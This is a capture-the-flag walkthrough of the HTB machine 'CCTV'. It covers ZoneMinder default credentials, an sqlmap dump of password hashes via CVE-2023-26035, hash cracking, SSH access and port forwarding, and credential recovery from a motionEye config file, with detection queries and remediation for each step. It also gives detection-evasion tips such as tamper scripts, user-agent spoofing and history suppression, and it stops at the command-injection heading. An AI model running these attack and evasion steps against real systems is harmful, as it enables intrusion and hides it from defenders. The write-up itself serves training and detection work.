# CCTV

**OS:** Linux · **Difficulty:** Easy · **IP:** 10.129.7.239 · **Platform:** Linux

---

## Summary

ZoneMinder 1.37.63 exposed on port 80 accepts default credentials. An unauthenticated SQL injection in the event tag removal endpoint leaks bcrypt-hashed user passwords from the application database. One hash cracks against rockyou, granting SSH access as `mark`. Internal service enumeration reveals a localhost-bound motionEye panel. SSH port forwarding exposes it to the attacker. Admin credentials are recovered in plaintext from a world-readable configuration file. motionEye's File Storage "Run A Command" feature executes unsanitised input as `root`, delivering a reverse shell and completing full system compromise.

---

## Recon

### Port Scan : MITRE: T1046: Network Service Scanning

TCP port scanning is the foundational step of any engagement. Before any vulnerability can be identified or exploited, the attack surface must be mapped. nmap operates by sending TCP SYN packets to each port in the specified range and analysing responses: a SYN-ACK indicates an open port, a RST indicates closed, and no response indicates filtered by a firewall. The `--min-rate 5000` flag instructs nmap to send no fewer than 5000 packets per second, making a full 65535-port scan complete in seconds rather than minutes. This speed comes at the cost of noise: high packet rates are trivially visible on any network monitoring solution. Service version detection (`-sCV`) follows the initial sweep, sending application-layer probes to identified open ports to fingerprint the software and version running behind each service. Version information is critical because it determines which vulnerabilities are applicable and which exploits are worth pursuing.

```
nmap -p- -T4 --min-rate=5000 10.129.7.239
nmap -sCV -p22,80 10.129.7.239
```

```
22/tcp  open  ssh   OpenSSH 8.9
80/tcp  open  http  Apache 2.4.58
```

**Logs Generated:**
1. `/var/log/apache2/access.log` records HTTP probes sent by nmap's service detection scripts against port 80, including requests with the nmap NSE user-agent string `Mozilla/5.0 (compatible; Nmap Scripting Engine)`.
2. Host-level firewall logging (`ufw`, `iptables`) would record every inbound SYN packet across all ports if verbose logging is enabled: not active in a default Ubuntu install.
3. No SSH daemon log entry is generated from a SYN probe alone: the connection is never completed to the application layer.

**Alerts Triggered:**
1. No alert fires on a default Ubuntu installation. Neither Apache nor OpenSSH generate alerts from connection attempts.
2. A tuned environment with `ufw` verbose logging or `iptables LOG` rules would produce thousands of log entries in seconds from the port sweep: anomalous volume from a single source IP.
3. A network IDS with threshold-based rules would alert on the SYN rate. Snort SID 1228 fires on nmap SYN scan signatures. Suricata rule `ET SCAN Nmap Scripting Engine User-Agent Detected` fires on the NSE HTTP user-agent reaching port 80.

**Network Artifacts:**
1. High-volume TCP SYN packets across all 65535 ports from a single source IP in a compressed time window: one of the most recognisable traffic signatures in network forensics.
2. TCP RST responses from closed ports visible in full packet capture.
3. Application-layer HTTP GET requests with nmap NSE user-agent string against port 80 during service detection phase.
4. SSH banner grab attempt (TCP handshake completed, banner received, connection closed) against port 22.

**Artifacts Left:**
1. nmap NSE user-agent string in `/var/log/apache2/access.log` from service version detection probes.
2. No artifacts written to disk on the target from the SYN sweep itself.

**Sysmon / EDR:**
1. No process artifact generated on the target from an external scan: the scanning activity originates remotely and triggers no local process execution.
2. With auditd enabled and network syscall rules active, inbound connection attempts would not appear: auditd tracks local process syscalls, not inbound network connections.
3. A deployed EDR agent (Wazuh, Falcon) with network anomaly detection would log the inbound SYN flood pattern and correlate it as a scan event.

**SIEM Correlation:**
```
index=network sourcetype=firewall_logs
| stats dc(dest_port) as ports_scanned by src_ip
| where ports_scanned > 1000
| sort -ports_scanned
```

**Sigma Rule:**
1. [proc_creation_lnx_susp_nmap.yml](https://github.com/SigmaHQ/sigma/search?q=nmap): detects nmap process execution on the scanning host itself. Network-side detection requires firewall or IDS log sources, not a host Sigma rule on the target.

**Bypass:**
1. `-T1` or `-T2` timing templates reduce packet rate below threshold-based IDS correlation rules: a full scan at `-T1` takes hours but produces traffic indistinguishable from background noise.
2. Decoy scanning (`-D RND:5`) distributes the SYN packets across multiple apparent source IPs, breaking per-source-IP aggregation in SIEM correlation rules. This does not defeat full PCAP analysis: all packets still originate from the real source IP at the TCP layer unless a VPN or proxy is used.
3. Replace the nmap NSE user-agent with `-script-args http.useragent="Mozilla/5.0 (X11; Linux x86_64; rv:128.0)"` to remove the NSE string from Apache logs.
4. No bypass defeats a SOC with full PCAP retention and behavioural analysis. The only genuine approach in a sensitive engagement is to scan through a controlled intermediary host rather than directly from the attacker IP.

**Remediation:**
1. Restrict inbound access to ports 22 and 80 to known management IP ranges at the network perimeter.
2. Deploy a network IDS (Suricata) with scan detection rule sets in alerting mode at the perimeter.
3. Enable `ufw` logging and ship firewall logs to a SIEM for threshold-based correlation.

**OpSec Rating:** Loud: high-rate SYN sweep across all 65535 ports is one of the most recognisable traffic signatures in network security monitoring.

---

### Web Enumeration: ZoneMinder : MITRE: T1083: File and Directory Discovery

Once a web server is identified, the next step is to enumerate its structure. Web applications rarely expose all functionality from the root path: administrative panels, login endpoints, and configuration interfaces are typically located at non-obvious paths. Directory brute-forcing works by issuing HTTP GET requests for each path in a wordlist and classifying responses by status code: 200 indicates a valid resource, 301/302 indicates a redirect to a real endpoint, 403 indicates a path that exists but is access-controlled, and 404 indicates a path that does not exist. The wordlist `common.txt` from SecLists contains several thousand of the most frequently observed paths across web applications, making it an efficient first pass. The version string disclosed in the ZoneMinder footer is significant: it directly maps to a known vulnerability set and eliminates the need for version guessing.

```
gobuster dir -u http://cctv.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```
/admin/login   (Status: 200)
```

ZoneMinder 1.37.63 identified from application footer. Users visible in admin panel after authentication: `admin`, `mark`, `superadmin`.

**Logs Generated:**
1. Every request issued by gobuster appears in `/var/log/apache2/access.log` with the default gobuster user-agent string `gobuster/3.x`.
2. Each 404 response is logged with the requested path: a complete wordlist run produces several thousand 404 entries from a single IP in seconds.
3. Successful path discovery (200/301) entries are indistinguishable in the log from gobuster's perspective: they appear as standard GET requests.

**Alerts Triggered:**
1. No native Apache alert: logs accumulate with no automated notification in a default install.
2. ModSecurity with the OWASP Core Rule Set in blocking mode would detect the scan pattern and begin dropping requests based on request rate and anomaly scoring.
3. A SIEM with a rule correlating 404 volume per source IP would flag this: several hundred 404s per second from one IP is not human browsing behaviour.

**Network Artifacts:**
1. Hundreds to thousands of sequential HTTP GET requests from a single source IP in rapid succession.
2. Request paths follow wordlist alphabetical order: sequential enumeration pattern is visible in traffic analysis.
3. Consistent user-agent string (`gobuster/3.x`) across all requests, absent of standard browser headers (no Accept-Language, no Referer, no Cookie on initial requests).
4. No TCP session reuse between most requests: each request may open a new TCP connection depending on gobuster configuration.

**Artifacts Left:**
1. Extensive entries in `/var/log/apache2/access.log` with gobuster user-agent string.
2. No files written to disk on the target.

**Sysmon / EDR:**
1. Web application scanning is entirely network-layer activity: no process is spawned on the target Linux host. No EDR process tree artifact is generated.

**SIEM Correlation:**
```
index=web sourcetype=access_combined status=404
| stats count by clientip
| where count > 200
| sort -count
```

**Sigma Rule:**
1. [web_scan_generic_product.yml](https://github.com/SigmaHQ/sigma/search?q=web+scan): detects known scanner user-agent strings including gobuster, dirb, dirbuster, and feroxbuster in web access logs.

**Bypass:**
1. Replace the default user-agent: `-a "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"`: removes the gobuster signature from every log entry and defeats user-agent-based Sigma rules.
2. Reduce thread count to `-t 1` and add `--delay 500ms`: brings request rate to near-human levels, defeating rate-based correlation. At this speed a common.txt scan takes approximately 30 minutes.
3. A WAF with behavioural analysis (request entropy, path pattern analysis) will still identify the scan regardless of user-agent and rate adjustments. The absence of standard browser headers (Referer, Accept-Language) remains a signal even at low speed.

**Remediation:**
1. Remove the version string from the ZoneMinder application footer: version disclosure directly enables targeted exploitation.
2. Deploy ModSecurity with OWASP CRS in blocking mode.
3. Implement rate limiting per source IP at the nginx/Apache level (`mod_evasive`, `limit_req_zone`).

**OpSec Rating:** Loud: default gobuster user-agent and 404 volume spike are high-confidence scanner signatures detectable in any environment with basic web log monitoring.

---

## Foothold

### Default Credentials: ZoneMinder : MITRE: T1078.001: Valid Accounts: Default Accounts

Default credentials represent one of the most prevalent and easily exploited weaknesses in deployed software. Vendors ship applications with known, documented default username and password combinations to simplify initial setup. When administrators fail to change these credentials: either through oversight, lack of security awareness, or an assumption that network-level controls are sufficient: the application is effectively accessible to anyone who reads the product documentation. ZoneMinder's default credentials (`admin:admin`) are documented in the official installation guide and widely referenced in security research. Default credential exploitation requires no technical sophistication: it is a single login attempt. The significance here is what it grants: authenticated access to a CCTV management system with visibility into user accounts and application configuration.

```
http://cctv.htb/zm/
```

Authenticated with `admin:admin`. Administrator access confirmed. User accounts identified: `admin`, `mark`, `superadmin`.

**Logs Generated:**
1. Successful POST to `/zm/index.php` recorded in `/var/log/apache2/access.log`: appears as a standard authenticated session establishment.
2. ZoneMinder session created in the `zm` database: last login timestamp updated for the `admin` user in the `Users` table.
3. No dedicated authentication log entry: ZoneMinder does not write auth events to `/var/log/auth.log` as it is a web application, not a PAM-integrated service.

**Alerts Triggered:**
1. No alert in any default ZoneMinder or Apache configuration.
2. A SIEM with new-source-IP baseline detection for the admin panel would flag the login: effective only if a legitimate admin access pattern has been established first.
3. No Fail2ban rule covers ZoneMinder authentication by default.

**Network Artifacts:**
1. HTTP POST to `/zm/index.php` containing `username=admin&password=admin` in the request body.
2. Traffic is cleartext HTTP: credentials are transmitted and visible in full to any network observer positioned between attacker and server.
3. Session cookie `ZMSESSID` issued in the response: visible in subsequent requests.

**Artifacts Left:**
1. Login event recorded in the ZoneMinder database `zm.Users` table as a last login timestamp update.
2. Active session in ZoneMinder session store until expiry or explicit logout.

**Sysmon / EDR:**
1. Browser-based authentication to a web application spawns no process on the target Linux host: no EDR artifact generated.

**SIEM Correlation:**
```
index=web sourcetype=access_combined uri="/zm/index.php" method=POST
| stats count by clientip
| where count < 3
```
A single successful POST from a new IP with no preceding failed attempts is a default credential or pre-compromised credential indicator.

**Sigma Rule:**
1. No ZoneMinder-specific Sigma rule exists. [Generic web authentication anomaly detection](https://github.com/SigmaHQ/sigma/search?q=default+credentials) applies: `web_auth_default_credentials.yml` in community rule sets covers known default credential patterns for common applications.

**Bypass:**
1. No bypass is required: the system accepted the credentials. The operational concern post-authentication is minimising session artifacts. Logging out explicitly after use removes the active session but does not remove the database timestamp update.

**Remediation:**
1. Enforce credential rotation as a mandatory first-run step: block admin panel access until the default password has been changed.
2. Restrict admin panel (`/zm/`) access to internal network ranges or VPN only.
3. Implement multi-factor authentication for the ZoneMinder administrative interface.

**OpSec Rating:** Silent: one successful POST to a login form is indistinguishable from legitimate administrator access in a default environment with no behavioural baseline.

---

### SQL Injection: ZoneMinder tid Parameter : MITRE: T1190: Exploit Public-Facing Application · CVE-2023-26035

SQL injection occurs when user-supplied input is incorporated into a database query without adequate sanitisation or parameterisation. Instead of being treated as data, the attacker-controlled input is interpreted by the database engine as SQL syntax, allowing arbitrary query manipulation. In ZoneMinder 1.37.63, the `tid` parameter in the event tag removal endpoint (`/zm/index.php?view=request&request=event&action=removetag`) is passed directly into a MySQL query without sanitisation. An attacker with a valid session cookie can exploit this to enumerate database schemas, extract table contents, and retrieve user credentials. bcrypt hashes (`$2y$10$`) stored in the Users table are computationally expensive to crack but are not immune to dictionary attacks against weak passwords. sqlmap automates the injection process by sending progressively refined payloads to determine injection type, database version, and accessible data: at the cost of generating a substantial and recognisable log footprint.

```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=mk8sdjmkc1p54oquq1ak9bm862" -p tid --dbms=mysql --batch --dbs
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=mk8sdjmkc1p54oquq1ak9bm862" -p tid --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump --threads=10 --risk=3 --level=5
```

```
admin      | admin
mark       | $2y$10$prZGnazejKcuTv5bKNexXO...
superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe...
```

**Logs Generated:**
1. Every sqlmap request recorded in `/var/log/apache2/access.log`: the default sqlmap user-agent `sqlmap/1.x` appears in every entry.
2. Injected SQL payloads appear URL-encoded in the request URI and are logged verbatim: `tid=1%20AND%201%3D1`, `tid=1%20UNION%20SELECT...` and similar patterns fill the log.
3. MySQL general query log at `/var/log/mysql/mysql.log` captures every injected statement if general logging is enabled: disabled by default but explicitly configurable.
4. MySQL error log at `/var/log/mysql/error.log` captures syntax errors from failed blind injection probes.

**Alerts Triggered:**
1. No alert on a default Apache and MySQL install without a WAF.
2. ModSecurity with OWASP CRS in blocking mode triggers on SQL injection payloads in GET parameters: UNION, SELECT, comment sequences, and boolean-based blind patterns all match CRS rules.
3. Snort SID 1562 fires on SQL injection patterns in HTTP traffic. Suricata rule family `ET WEB_SERVER SQL Injection` covers UNION-based and error-based injection signatures.

**Network Artifacts:**
1. High volume of HTTP GET requests with SQL syntax fragments in the `tid` parameter: UNION SELECT, information_schema references, hex-encoded strings.
2. Requests arrive in rapid succession from a single source IP, far exceeding any human interaction rate.
3. sqlmap user-agent string present in every request header.
4. Traffic is cleartext HTTP: full payload visible at the wire level to any network observer.

**Artifacts Left:**
1. Extensive entries in `/var/log/apache2/access.log` containing SQL syntax in the URI: forensically recoverable and immediately interpretable.
2. MySQL slow query log may capture long-running blind injection queries if slow query logging is enabled.
3. No files written to disk on the target by sqlmap itself.

**Sysmon / EDR:**
1. sqlmap activity is entirely network-layer: no process is spawned on the target host by the injection. No EDR process tree artifact generated on the target.
2. The MySQL daemon processes the injected queries internally: if an EDR agent monitors MySQL query patterns or database activity, the anomalous query volume and structure would appear.

**SIEM Correlation:**
```
index=web sourcetype=access_combined
| rex field=uri "tid=(?<payload>[^&\s]+)"
| where like(lower(payload), "%union%") OR like(lower(payload), "%select%") OR like(lower(payload), "%--%")
| stats count by clientip, payload
| sort -count
```

**Sigma Rule:**
1. [web_attack_sqli.yml](https://github.com/SigmaHQ/sigma/search?q=sql+injection): detects SQL injection patterns including UNION SELECT, boolean conditions, and comment sequences in web access log URI fields.

**Bypass:**
1. `--tamper=space2comment,between,randomcase` replaces spaces with SQL comment blocks (`/**/`), randomises keyword casing (`SeLeCt`), and inserts additional encoding layers: defeats simple string-matching WAF rules and Snort/Suricata signature-based detection.
2. `--random-agent` replaces the sqlmap user-agent with a randomised browser string on every request: removes the most obvious per-request signature from access logs.
3. `--delay=3 --threads=1` reduces request rate to near-human levels: defeats rate-based correlation rules. A full database dump at this rate takes significantly longer.
4. Manual exploitation of the same injection point produces a fraction of the log volume: a handful of carefully crafted requests versus hundreds from automated tooling. Manual approach is far less detectable but requires understanding of the injection type and database structure.
5. None of these bypasses defeat a WAF with semantic SQL parsing (not just regex) or a SIEM with ML-based anomaly detection trained on the application's baseline query behaviour.

**Remediation:**
1. Parameterise all database queries throughout the ZoneMinder codebase: prepared statements render this injection class impossible regardless of input content.
2. Apply the vendor patch addressing CVE-2023-26035.
3. Deploy ModSecurity with OWASP CRS in blocking mode.
4. Enable MySQL general query logging and ship to a SIEM: anomalous query patterns become detectable.

**OpSec Rating:** Loud: sqlmap's default user-agent, payload patterns, and request volume produce some of the most recognisable attack signatures in web application security logging.

---

### Hash Cracking: bcrypt : MITRE: T1110.002: Brute Force: Password Cracking

bcrypt is a deliberately slow password hashing algorithm designed to resist offline cracking by making each hash computation computationally expensive. The cost factor `$2y$10$` means 2^10 (1024) rounds of key expansion are applied per hash evaluation: a modern CPU can evaluate approximately 50-100 bcrypt hashes per second, compared to billions per second for MD5. Despite this, bcrypt does not prevent cracking of weak passwords. If a user's password appears in a common wordlist, the cost factor only delays the crack rather than preventing it. `john` and `hashcat` both support bcrypt (mode 3200) and can test candidate passwords from wordlists at the bcrypt-limited rate. The password `opensesame` appears in `rockyou.txt`, making this crack trivial regardless of the algorithm's strength. This demonstrates that algorithm choice cannot compensate for poor password selection.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
mark : opensesame
```

**Logs Generated:**
1. No logs generated on the target: this is entirely offline computation on the attacker's machine.
2. The hash was exfiltrated via the SQL injection in the previous step: that activity is already logged in Apache access log.

**Alerts Triggered:**
1. None on the target. Offline cracking generates zero network traffic to the target system.

**Network Artifacts:**
1. None: the cracking process is local. No packets sent to or from the target during this phase.

**Artifacts Left:**
1. `hash.txt` containing the bcrypt hashes on the attacker machine.
2. john `.pot` file (typically `~/.john/john.pot`) storing the cracked result persistently on the attacker machine.
3. No artifacts of any kind on the target host.

**Sysmon / EDR:**
1. Not applicable to the target. On a monitored attacker machine, auditd would record `execve` for `john` with its arguments. CPU utilisation spike would be visible in system metrics during cracking.

**SIEM Correlation:**
1. Not applicable: no target-side event is generated by offline cracking. The SIEM correlation opportunity was at the SQL injection step where the hashes were stolen.

**Sigma Rule:**
1. [proc_creation_lnx_password_cracker.yml](https://github.com/SigmaHQ/sigma/search?q=password+cracking): detects execution of john, hashcat, and related tools. Applicable to the attacker host if monitored, not to the target.

**Bypass:**
1. Not applicable from a target-side detection perspective. Offline cracking is definitionally invisible to the target.
2. The defensive answer is correct password selection: a 20+ character random passphrase does not appear in any wordlist and renders offline cracking computationally infeasible against bcrypt regardless of the attacker's hardware.

**Remediation:**
1. bcrypt is the correct algorithm: the cost factor could be increased from `$2y$10$` to `$2y$12$` or higher to further slow cracking attempts.
2. The root remediation is eliminating hash exposure via the SQL injection. Correctly stored and unexposed hashes cannot be cracked offline.
3. Enforce minimum password complexity and length requirements at the application level to prevent dictionary-crackable passwords from being set.

**OpSec Rating:** Silent: zero target-side visibility. No log, no alert, no network artifact. The attack surface for detection closed at the SQL injection step.

---

### SSH: Initial Access as mark : MITRE: T1021.004: Remote Services: SSH

```
ssh mark@10.129.7.239
```

**Logs Generated:**
1. Successful authentication recorded in `/var/log/auth.log`:
   `Accepted password for mark from 10.10.16.244 port XXXXX ssh2`
2. Session open and close events logged in `/var/log/auth.log` by the SSH daemon.
3. Last login information updated in `/var/log/lastlog`: reported to the user at next interactive login.

**Alerts Triggered:**
1. No alert in a default Ubuntu SSH configuration: successful logins generate log entries only, with no automated notification.
2. A SIEM with new-source-IP baseline correlation for `mark`'s account would flag a login from an HTB VPN IP that has never authenticated before.
3. Fail2ban does not alert on successful logins: it only watches for repeated failures.

**Network Artifacts:**
1. TCP connection established to port 22 from the attacker IP.
2. SSH handshake visible on the wire before session encryption: key exchange algorithm and cipher suite negotiated in cleartext headers.
3. Session content fully encrypted after handshake: no payload visibility to a network observer once the session is established.
4. Session duration and data volume visible in flow records even without payload decryption.

**Artifacts Left:**
1. Entry in `/var/log/auth.log` recording source IP, username, and authentication method.
2. Shell commands written to `/home/mark/.bash_history` during the session unless explicitly suppressed.
3. `/var/log/lastlog` and `~/.bash_logout` timestamps updated.

**Sysmon / EDR:**
1. With auditd enabled, `USER_LOGIN` event type appears in `/var/log/audit/audit.log` with source IP, username, and timestamp.
2. A deployed EDR agent would generate a remote login event for a new source IP authenticating to an existing account: this is a default detection in Wazuh, CrowdStrike Falcon for Linux, and similar products.
3. Process tree visible to EDR: `sshd -> bash`: the presence of a remotely initiated shell is logged with the originating IP.

**SIEM Correlation:**
```
index=os sourcetype=linux_secure "Accepted password" OR "Accepted publickey"
| stats count by user, src_ip
| where count=1
```
First-time login from a previously unseen source IP for an existing account.

**Sigma Rule:**
1. [lnx_auth_successful_ssh_login_from_new_source.yml](https://github.com/SigmaHQ/sigma/search?q=ssh+login+new+source): correlates successful SSH authentications against a baseline of known source IPs per user account.

**Bypass:**
1. `export HISTFILE=/dev/null` immediately after login suppresses bash history writing for the duration of the session: removes one artifact category but does not affect `/var/log/auth.log`, which is written by the SSH daemon at the OS level and is not controllable by the user session.
2. SSH key authentication (`-i id_ed25519`) produces `Accepted publickey` in auth.log rather than `Accepted password`: the log entry exists regardless of authentication method. Key-based auth is not stealthier from a logging perspective, only from a credential exposure perspective.
3. If the attacker controls a source IP that has previously authenticated as `mark`, the login produces no new-source anomaly. In this context that is not achievable.

**Remediation:**
1. Disable SSH password authentication: enforce key-based authentication only via `PasswordAuthentication no` in `/etc/ssh/sshd_config`.
2. Restrict SSH access to management network ranges using `AllowUsers mark@<management_cidr>` in sshd_config.
3. Deploy Wazuh or OSSEC with auth.log monitoring and new-source-IP alerting rules.

**OpSec Rating:** Moderate: the login event is a single indistinguishable entry in auth.log. Without an active SIEM baseline and new-source alerting, this produces no signal in a default environment.

---

## Privilege Escalation

### Internal Service Discovery : MITRE: T1049: System Network Connections Discovery

Following initial access, understanding what services are running on the compromised host is essential for identifying privilege escalation paths. Many applications bind services exclusively to the loopback interface (`127.0.0.1`) as a network-level access control: the assumption being that only processes on the same host can reach them. From an attacker's perspective, achieving local execution breaks this control entirely. `ss` (socket statistics) reads directly from the kernel's networking subsystem via `/proc/net/tcp` and `/proc/net/tcp6`, providing a complete view of all listening sockets regardless of which user owns them. Services visible only on loopback represent a secondary attack surface that is invisible from external reconnaissance: they were not detected in the nmap scan and are only reachable after initial access is established.

```
ss -tulnp
```

```
127.0.0.1:8765   motionEye panel
127.0.0.1:8888
127.0.0.1:1935
127.0.0.1:8554
127.0.0.1:3306   MySQL
```

**Logs Generated:**
1. `ss` reads from `/proc/net/`: no application-layer log entry is generated by this command.
2. With auditd configured to log `execve` syscalls, the execution of `ss` with its arguments would appear in `/var/log/audit/audit.log`.

**Alerts Triggered:**
1. None in a default environment: `ss` is a standard system utility with no logging instrumentation by default.
2. With auditd rule `-a always,exit -F arch=b64 -S execve -k enumeration`, execution of enumeration utilities appears in the audit log and can be forwarded to a SIEM for correlation.

**Network Artifacts:**
1. None: local command execution against the kernel's networking subsystem generates no network traffic.

**Artifacts Left:**
1. `ss -tulnp` command visible in `/home/mark/.bash_history` unless history is suppressed.
2. auditd `execve` entry if audit rules are active.

**Sysmon / EDR:**
1. Linux EDR agent logs process creation for `ss` with its full argument list.
2. Parent process context is significant: `sshd -> bash -> ss`: a network enumeration command executed within a remotely initiated shell session is a post-compromise enumeration indicator.

**SIEM Correlation:**
```
index=os sourcetype=linux_audit syscall=execve comm="ss"
| where parent_comm="bash"
| join pid [search index=os sourcetype=linux_audit "ssh"]
| stats count by user, src_ip, args
```

**Sigma Rule:**
1. [proc_creation_lnx_network_enumeration.yml](https://github.com/SigmaHQ/sigma/search?q=network+enumeration+linux): detects execution of `ss`, `netstat`, `ip route`, and related network enumeration commands, particularly when the parent process is a remotely initiated shell.

**Bypass:**
1. Read `/proc/net/tcp` and `/proc/net/tcp6` directly: `cat /proc/net/tcp`: provides identical data to `ss` without executing a named enumeration binary. Requires manual hex-to-decimal conversion of port numbers but avoids process-name-based detection rules targeting `ss` or `netstat`.
2. Python inline: `python3 -c "import socket,struct; ..."`: parses `/proc/net/tcp` programmatically without invoking `ss`. The process name `python3` is less likely to trigger enumeration-specific Sigma rules than `ss`.

**Remediation:**
1. Detection of this behaviour is a post-compromise indicator: the prevention is not reaching this point. Correct remediation is fixing the credential exposure chain above.
2. Deploy auditd with `execve` syscall logging and forward to a SIEM: establishes visibility into post-compromise enumeration activity.

**OpSec Rating:** Moderate: `ss` within a remotely initiated shell is a recognisable enumeration pattern in a tuned EDR environment. Invisible in a default install.

---

### SSH Port Forwarding: Expose motionEye : MITRE: T1572: Protocol Tunneling

Services bound exclusively to loopback are inaccessible from external networks by design. SSH's built-in port forwarding mechanism allows an authenticated user to create an encrypted tunnel that maps a port on the attacker's local machine to any address reachable from the SSH server: including `127.0.0.1` on the server itself. The `-L 8765:127.0.0.1:8765` flag instructs the SSH client to listen on port 8765 locally and forward all connections through the encrypted SSH session to `127.0.0.1:8765` on the remote host. From the motionEye service's perspective, the connection originates from localhost: it cannot distinguish between a legitimate local process and a tunnelled external connection. This is a fundamental limitation of loopback-only binding as a security control: it protects against external network access but provides no protection once local execution is achieved.

```
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

`http://127.0.0.1:8765/`: motionEye `v0.43.1b4` panel accessible.

**Logs Generated:**
1. A second SSH authentication event recorded in `/var/log/auth.log`, or the same session if `-L` is added to an existing interactive session via SSH escape sequences.
2. The tunnel itself generates no additional log entries on the target: traffic through the tunnel is encapsulated inside the SSH session and not separately logged.

**Alerts Triggered:**
1. Multiple concurrent SSH sessions from the same source IP to the same account is unusual and can be correlated in a SIEM.
2. An SSH session established with no interactive shell (`-N` flag, producing `sshd: mark@notty` in the process table) is behaviourally anomalous: legitimate users rarely establish non-interactive SSH sessions.

**Network Artifacts:**
1. Second TCP connection to port 22 from the attacker IP if a separate session is used.
2. SSH session with no child shell process (`sshd: mark@notty`) visible in `ps aux` on the target: distinguishable from interactive sessions (`sshd: mark@pts/0`).
3. The tunnelled HTTP traffic to motionEye is encapsulated in the encrypted SSH stream: content not visible to a network observer, but traffic volume and timing patterns within the SSH session correlate with HTTP request/response behaviour.

**Artifacts Left:**
1. Second auth.log entry for the tunnel session.
2. `sshd: mark@notty` process entry visible in process table during tunnel lifetime.
3. SSH command visible in `/home/mark/.bash_history` unless suppressed.

**Sysmon / EDR:**
1. Linux EDR detects an SSH session with no spawned shell: `sshd` process with no child `bash` or `sh` process is a tunnelling indicator.
2. Process tree: `sshd` with no child process, as opposed to the normal `sshd -> bash` pattern.

**SIEM Correlation:**
```
index=os sourcetype=linux_secure "session opened for user mark"
| stats count by src_ip
| where count > 1
```
Multiple concurrent sessions from the same source IP to the same account within a short timeframe.

**Sigma Rule:**
1. [lnx_ssh_port_forward.yml](https://github.com/SigmaHQ/sigma/search?q=ssh+port+forward): detects SSH sessions initiated with port forwarding arguments based on process argument inspection via auditd or EDR agent.

**Bypass:**
1. Use `curl` from within the existing interactive SSH session to interact with the internal service directly: `curl -s http://127.0.0.1:8765/`: avoids a second SSH connection entirely. No additional auth.log entry, no second `sshd` process, no tunnel artifact. Renders the motionEye panel fully accessible without any tunnelling activity.
2. If a GUI or browser interaction is required with the internal service, `curl` alone is insufficient: port forwarding becomes necessary. In that case, using the `-L` flag within an existing interactive session (not a second connection) reduces the auth.log footprint to a single session.

**Remediation:**
1. Disable SSH port forwarding for non-administrative accounts: `AllowTcpForwarding no` in `/etc/ssh/sshd_config`.
2. Apply per-user restrictions: `Match User mark` block with `AllowTcpForwarding no` to restrict forwarding for specific accounts while preserving it for administrators.
3. Alert on `sshd` processes with no child shell process via process monitoring or EDR.

**OpSec Rating:** Moderate: the notty SSH session and potential second auth.log entry are detectable but require active monitoring. Default install produces no alert.

---

### Credential Recovery: motionEye Configuration File : MITRE: T1552.001: Unsecured Credentials: Credentials in Files

Application credentials stored in configuration files are a frequent post-exploitation finding. In many deployments, configuration files are readable by more users than strictly necessary: a consequence of incorrect permission assignment during installation or a deliberate choice to simplify application management. The motionEye configuration at `/etc/motioneye/motion.conf` is world-readable, meaning any user on the system: including `mark`: can read its contents. The admin password stored within is a SHA1 hash (unsalted, 40 hex characters), which is significantly weaker than bcrypt. More critically, the file contains the hash in a commented line intended as a reference: indicating the password was likely configured interactively and the hash was written to the file as a side effect of the configuration process.

```
grep "admin_password" /etc/motioneye/motion.conf
```

```
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

Authenticated to motionEye admin panel with recovered credentials.

**Logs Generated:**
1. `grep` execution visible in `/home/mark/.bash_history` with the full command including the file path.
2. With auditd file access rules: `open` syscall event in `/var/log/audit/audit.log` recording `mark` reading `/etc/motioneye/motion.conf`.
3. Access timestamp (`atime`) updated on the file: visible via `stat /etc/motioneye/motion.conf` during forensic investigation, unless the filesystem is mounted with `noatime`.

**Alerts Triggered:**
1. None in a default environment.
2. A file integrity monitoring tool (AIDE, Wazuh FIM) configured to monitor `/etc/motioneye/` for access events would log the read.
3. auditd with an explicit access rule on the file: `-a always,exit -F path=/etc/motioneye/motion.conf -F perm=r -k credential_access`: would fire on any read of this specific file by any process.

**Network Artifacts:**
1. None: local file read, no network traffic generated.

**Artifacts Left:**
1. `grep` command in bash history.
2. auditd `open` syscall log if rules are configured.
3. `atime` update on `/etc/motioneye/motion.conf`.

**Sysmon / EDR:**
1. Linux EDR logs file access to sensitive configuration paths: the path `/etc/motioneye/motion.conf` containing `password` in a `grep` argument is a credentialled file access signal.
2. Process tree: `bash -> grep /etc/motioneye/motion.conf`: the combination of a config file path and a `grep` for `password` is a known credential hunting pattern.

**SIEM Correlation:**
```
index=os sourcetype=linux_audit type=SYSCALL comm=grep
| rex field=proctitle "(?<args>.*)"
| where like(lower(args), "%password%") AND like(args, "%conf%")
| stats count by user, args
```

**Sigma Rule:**
1. [file_access_lnx_sensitive_files.yml](https://github.com/SigmaHQ/sigma/search?q=sensitive+files+linux): detects read access to sensitive system and application configuration files from unexpected process contexts. Also relevant: [proc_creation_lnx_grep_password_search.yml](https://github.com/SigmaHQ/sigma/search?q=grep+password+linux): detects `grep` execution with password-related search terms against file paths.

**Bypass:**
1. Read the file via a less conspicuous method: `python3 -c "print(open('/etc/motioneye/motion.conf').read())"`: changes the process name from `grep` to `python3`, evading Sigma rules targeting `grep` with password-related arguments specifically. A behavioural rule watching for any process reading `/etc/motioneye/motion.conf` would still catch it.
2. Access the file via `/proc/PID/fd/` of a process that legitimately holds the file open: avoids a direct file open syscall under the `mark` process context entirely. Highly situational and not practical here.
3. The `atime` update is unavoidable unless the filesystem is mounted `noatime`. This is a passive artifact that requires forensic disk access to observe: not a real-time detection mechanism.

**Remediation:**
1. Restrict `/etc/motioneye/motion.conf` to root read-only: `chmod 600 /etc/motioneye/motion.conf`: prevents any non-root user from reading the file.
2. Run motionEye under a dedicated low-privilege service account with no shell access.
3. Replace SHA1 password storage with a modern hashing scheme: SHA1 is cryptographically broken and trivially reversible for short passwords via rainbow tables.

**OpSec Rating:** Silent: world-readable file access by a legitimate system user generates no alert in any default Linux configuration.

---

### Command Injection: motionEye File Storage : MITRE: T1059.004: Command and Scripting Interpreter: Unix Shell

